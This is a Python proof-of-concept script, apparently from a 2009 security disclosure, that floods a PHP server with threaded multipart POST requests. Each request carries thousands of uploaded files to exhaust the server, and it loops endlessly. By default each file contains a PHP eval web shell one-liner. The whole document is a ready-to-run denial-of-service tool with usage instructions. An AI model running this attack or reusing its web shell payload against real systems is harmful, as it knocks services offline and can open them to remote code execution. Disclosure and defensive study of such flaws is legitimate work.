#!/usr/bin/python

# PHP MultiPart Form-Data Denial of Service proof of concept, 23-10-2009
# Bogdan Calin (bogdan@acunetix.com)
#
import httplib, urllib, sys, string, threading
from string import replace
from urlparse import urlparse

def usage():
        print "****************************************************************************"
        print " PHP MultiPart Form-Data Denial of Service proof of concept"
        print " Bogdan Calin (bogdan@acunetix.com)"
        print ""
        print " Usage: php_mpfd_dos.py url [number_of_threads] [number_of_files] [data]"
        print ""
        print "  [number_of_threads] - optional, default 10"
        print "  [number_of_files] - optional, default 15000"
        print "  [data] - content of the files, by default it will create files containing"
        print "           the string <?php eval($_REQUEST[x]); ?>"
        print ""
        print " Example: php_mpfd_dos.py http://ubuntu/index.php"
        print "****************************************************************************"

class PhpMPFDDosThread ( threading.Thread ):
        # Override Thread's __init__ method to accept the parameters needed:
        def __init__ ( self, host, path, files ):
                self.host = host
                self.path = path
                self.files = files
                threading.Thread.__init__ ( self )

        # run in loop
        def run(self):
                while(1):
                        try:
                                self.post_data()
                        except:
                                print "*",

        # post multipart_formdata
        def post_data(self):
            content_type, body = self.encode_multipart_formdata()
            h = httplib.HTTPConnection(self.host)
            headers = {
                'User-Agent': 'Opera/9.20 (php_mpfd_dos;poc)',
                'Accept': '*/*',
                'Content-Type': content_type
                }
            h.request('POST', self.path, body, headers)
            print ".",

        # encode multipart_formdata
        def encode_multipart_formdata(self):
                """
                adapted from http://code.activestate.com/recipes/146306/
                files is a sequence of (name, filename, value) elements for data to be uploaded as files
                Return (content_type, body) ready for httplib.HTTP instance
                """
                BOUNDARY = '----------PHP_MPFD_DOS'
                CRLF = '\r\n'
                L = []
                for (key, filename, value) in self.files:
                    L.append('--' + BOUNDARY)
                    L.append('Content-Disposition: form-data; name="%s"; filename="%s"' % (key, filename))
                    L.append('Content-Type: application/octet-stream')
                    L.append('')
                    L.append(value)
                L.append('--' + BOUNDARY + '--')
                L.append('')
                body = CRLF.join(L)
                content_type = 'multipart/form-data; boundary=%s' % BOUNDARY
                return content_type, body

def main():
        if len(sys.argv)<=1:
                usage()
                sys.exit()

        # default values
        number_of_threads = 10
        number_of_files = 15000
        data = "<?php eval($_REQUEST[x]); ?>"

        if len(sys.argv)>2:
                number_of_threads = int(sys.argv[2])

        if len(sys.argv)>3:
                number_of_files = int(sys.argv[3])

        if len(sys.argv)>4:
                data = sys.argv[4]

        url = sys.argv[1]
        print "[-] target: " + url

        # parse target url
        up = urlparse(url)
        host = up.netloc
        path = up.path

        # prepare files
        files = []
        for i in range(0, number_of_files):
                files.append(('fu[]', 'f'+str(i), data))

        # start the threads
        for x in xrange ( number_of_threads ):
                PhpMPFDDosThread(host, path, files).start()

if __name__ == '__main__':
    main()